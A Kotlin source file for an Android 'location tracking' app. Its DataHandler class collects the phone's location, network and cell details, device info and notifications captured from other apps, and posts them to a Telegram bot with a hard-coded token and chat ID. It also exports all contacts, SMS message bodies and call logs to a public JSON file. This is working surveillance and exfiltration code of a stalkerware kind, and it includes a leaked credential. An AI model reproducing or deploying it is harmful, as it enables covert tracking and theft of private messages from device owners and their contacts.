package com.example.location_tracking_app

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.Location
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.CellIdentityGsm
import android.telephony.CellIdentityLte
import android.telephony.CellIdentityWcdma
import android.telephony.CellInfo
import android.telephony.CellInfoGsm
import android.telephony.CellInfoLte
import android.telephony.CellInfoWcdma
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.ActivityCompat
import com.example.location_tracking_app.db.AppDatabase
import com.example.location_tracking_app.db.NotificationEntity
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationTokenSource
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

// Data classes for export
data class Contact(val id: String, val name: String, val phoneNumbers: List<String>)
data class SmsMessage(val address: String, val body: String, val date: Long, val type: String)
data class CallLogEntry(val number: String, val type: String, val date: Long, val duration: String)


class DataHandler(private val context: Context) {
    private val fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
    private val notificationDao = AppDatabase.getDatabase(context).notificationDao()

    companion object {
        private const val TAG = "DataHandler"
    }

    /**
     * Gathers all device data and sends it to the API.
     * @param clearNotificationsAfterSend If true, notifications will be deleted from the local DB upon a successful send.
     * @return True if the data was sent successfully, false otherwise.
     */
    suspend fun gatherAndSendData(clearNotificationsAfterSend: Boolean): Boolean {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Permissions not granted. Cannot send data.")
            return false
        }

        val notifications = notificationDao.getAll()
        Log.d(TAG, "Found ${notifications.size} notifications.")

        val location = getCurrentLocation()
        val batteryInfo = getBatteryInfo()
        val wifiInfo = getWifiInfo()
        val cellInfo = getCellularInfo()
        val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
        val androidVersion = "Android ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})"
        val prefs = context.getSharedPreferences(MainActivity.PREFS_NAME, Context.MODE_PRIVATE)
        val deviceName = prefs.getString(MainActivity.KEY_DEVICE_NAME, "Unnamed Device") ?: "Unnamed Device"

        val isSuccess = sendDataToApi(
            deviceName = deviceName,
            location = location,
            batteryInfo = batteryInfo,
            wifiInfo = wifiInfo,
            cellInfo = cellInfo,
            deviceModel = deviceModel,
            androidVersion = androidVersion,
            notifications = notifications
        )

        if (isSuccess && clearNotificationsAfterSend && notifications.isNotEmpty()) {
            val idsToDelete = notifications.map { it.id }
            notificationDao.deleteByIds(idsToDelete)
            Log.d(TAG, "Successfully sent and deleted ${idsToDelete.size} notifications.")
        }
        return isSuccess
    }

    private suspend fun getCurrentLocation(): Location? {
        return try {
            fusedLocationClient.getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, CancellationTokenSource().token).await()
        } catch (e: SecurityException) {
            Log.e(TAG, "Location permission not granted.", e)
            null
        } catch (e: Exception) {
            Log.e(TAG, "Failed to get location.", e)
            null
        }
    }

    private fun getBatteryInfo(): Map<String, String> {
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val level = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        
        val intentFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val batteryStatus: Intent? = context.registerReceiver(null, intentFilter)
        val status: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        val isCharging: Boolean = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL

        return mapOf(
            "level" to "$level%",
            "chargingStatus" to if (isCharging) "Plugged In" else "Not Charging"
        )
    }

    private fun getWifiInfo(): Map<String, String> {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val capabilities = connectivityManager.getNetworkCapabilities(connectivityManager.activeNetwork)
        if (capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true) {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val connectionInfo = wifiManager.connectionInfo
            return mapOf(
                "ssid" to connectionInfo.ssid.removeSurrounding("\""),
                "bssid" to connectionInfo.bssid
            )
        }
        return mapOf("ssid" to "N/A", "bssid" to "N/A")
    }

    @SuppressLint("MissingPermission")
    private fun getCellularInfo(): Map<String, String> {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return mapOf("error" to "Permission not granted")
        }
        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val cellInfoList: List<CellInfo>? = telephonyManager.allCellInfo

        val primaryCell = cellInfoList?.firstOrNull { it.isRegistered }

        if (primaryCell != null) {
            val cellId: String
            val signalStrength: String
            when (primaryCell) {
                is CellInfoLte -> {
                    val cellIdentity: CellIdentityLte = primaryCell.cellIdentity
                    cellId = "LTE - CI: ${cellIdentity.ci}"
                    signalStrength = "${primaryCell.cellSignalStrength.dbm} dBm"
                }
                is CellInfoGsm -> {
                    val cellIdentity: CellIdentityGsm = primaryCell.cellIdentity
                    cellId = "GSM - CID: ${cellIdentity.cid}"
                    signalStrength = "${primaryCell.cellSignalStrength.dbm} dBm"
                }
                is CellInfoWcdma -> {
                    val cellIdentity: CellIdentityWcdma = primaryCell.cellIdentity
                    cellId = "WCDMA - CID: ${cellIdentity.cid}"
                    signalStrength = "${primaryCell.cellSignalStrength.dbm} dBm"
                }
                else -> {
                    cellId = "Unknown Type"
                    signalStrength = "N/A"
                }
            }
            return mapOf("cell_id" to cellId, "signal_strength" to signalStrength)
        }
        return mapOf("cell_id" to "N/A", "signal_strength" to "N/A")
    }

    private suspend fun sendDataToApi(
        deviceName: String,
        location: Location?,
        batteryInfo: Map<String, String>,
        wifiInfo: Map<String, String>,
        cellInfo: Map<String, String>,
        deviceModel: String,
        androidVersion: String,
        notifications: List<NotificationEntity>
    ): Boolean {
        return withContext(Dispatchers.IO) {
            val botToken = "7613366750:AAF18u337ZGgfrlCw9Kh7Txgip6gbZFUXh4" // Replace with your bot token
            val chatId = "5080555370" // Replace with your chat ID

            val latitude = location?.latitude ?: "N/A"
            val longitude = location?.longitude ?: "N/A"

            val notificationText = if (notifications.isNotEmpty()) {
                val formatter = SimpleDateFormat("HH:mm", Locale.getDefault())
                val builder = StringBuilder("\n\n🔔 *Recent Notifications*:")
                notifications.take(15).forEach {
                    val time = formatter.format(Date(it.timestamp))
                    builder.append("\n`[$time] ${it.packageName}`\n*${it.title.trim()}*\n_${it.text.trim()}_")
                }
                builder.toString()
            } else ""

            val message = """
            📱 *${deviceName.ifBlank { "Device Update" }}*
            
            📍 *Location*:
            - Lat/Lng: $latitude, $longitude
            - [View on Maps](https://maps.google.com/?q=$latitude,$longitude)
            
            🔋 *Battery*: ${batteryInfo["level"]} (${batteryInfo["chargingStatus"]})
            
            📡 *Network*:
            - WiFi: ${wifiInfo["ssid"]}
            - Cell ID: ${cellInfo["cell_id"]}
            - Signal: ${cellInfo["signal_strength"]}
            
            ⚙️ *Device Info*:
            - Model: $deviceModel
            - OS: $androidVersion
            $notificationText
            """.trimIndent()

            var urlConnection: HttpURLConnection? = null
            try {
                val url = URL("https://api.telegram.org/bot$botToken/sendMessage")
                urlConnection = url.openConnection() as HttpURLConnection
                urlConnection.requestMethod = "POST"
                urlConnection.doOutput = true
                urlConnection.setRequestProperty("Content-Type", "application/json")

                val payload = JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", message)
                    put("parse_mode", "Markdown")
                }.toString()

                OutputStreamWriter(urlConnection.outputStream).use { it.write(payload) }

                val responseCode = urlConnection.responseCode
                Log.d(TAG, "Telegram API response: $responseCode")
                responseCode in 200..299
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send data to Telegram", e)
                false
            } finally {
                urlConnection?.disconnect()
            }
        }
    }
    
    // --- EXPORT LOGIC ---
    
    suspend fun exportAllData(): String? {
         return withContext(Dispatchers.IO) {
            try {
                val mainJson = JSONObject()
                mainJson.put("export_timestamp", System.currentTimeMillis())
                mainJson.put("contacts", getContactsJson())
                mainJson.put("sms_messages", getSmsJson())
                mainJson.put("call_logs", getCallLogsJson())

                val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                if (!downloadsDir.exists()) downloadsDir.mkdirs()
                
                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                val file = File(downloadsDir, "device_export_$timestamp.json")
                
                file.writeText(mainJson.toString(4)) // Pretty print JSON
                Log.d(TAG, "Export successful. File saved to ${file.absolutePath}")
                file.absolutePath
            } catch (e: Exception) {
                Log.e(TAG, "Failed to export data", e)
                null
            }
        }
    }
    
    private fun getContactsJson(): JSONArray {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return JSONArray()
        val contactsList = mutableListOf<Contact>()
        
        val contentResolver = context.contentResolver
        val cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)

        cursor?.use {
            while(it.moveToNext()) {
                val id = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
                val hasPhoneNumber = it.getInt(it.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0
                val phoneNumbers = mutableListOf<String>()

                if (hasPhoneNumber) {
                    val pCur = contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        arrayOf(id),
                        null
                    )
                    pCur?.use { phoneCursor ->
                        while(phoneCursor.moveToNext()) {
                            val phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                            phoneNumbers.add(phoneNumber)
                        }
                    }
                }
                contactsList.add(Contact(id, name, phoneNumbers))
            }
        }

        val jsonArray = JSONArray()
        contactsList.forEach { contact ->
            jsonArray.put(JSONObject().apply {
                put("name", contact.name)
                put("phone_numbers", JSONArray(contact.phoneNumbers))
            })
        }
        return jsonArray
    }
    
     private fun getSmsJson(): JSONArray {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return JSONArray()
        val smsList = mutableListOf<SmsMessage>()
        val cursor = context.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
        cursor?.use {
            while (it.moveToNext()) {
                val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
                val type = when(it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))) {
                    Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
                    Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
                    else -> "other"
                }
                smsList.add(SmsMessage(address, body, date, type))
            }
        }

        val jsonArray = JSONArray()
        smsList.forEach { sms ->
            jsonArray.put(JSONObject().apply {
                put("address", sms.address)
                put("body", sms.body)
                put("date_ms", sms.date)
                put("type", sms.type)
            })
        }
        return jsonArray
    }
    
    private fun getCallLogsJson(): JSONArray {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return JSONArray()
        val callLogList = mutableListOf<CallLogEntry>()
        val cursor = context.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")

        cursor?.use {
            while (it.moveToNext()) {
                val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                val typeStr = when (it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))) {
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.MISSED_TYPE -> "missed"
                    else -> "other"
                }
                val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                val duration = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                callLogList.add(CallLogEntry(number, typeStr, date, duration))
            }
        }
        
        val jsonArray = JSONArray()
        callLogList.forEach { log ->
            jsonArray.put(JSONObject().apply {
                put("number", log.number)
                put("type", log.type)
                put("date_ms", log.date)
                put("duration_sec", log.duration)
            })
        }
        return jsonArray
    }
}
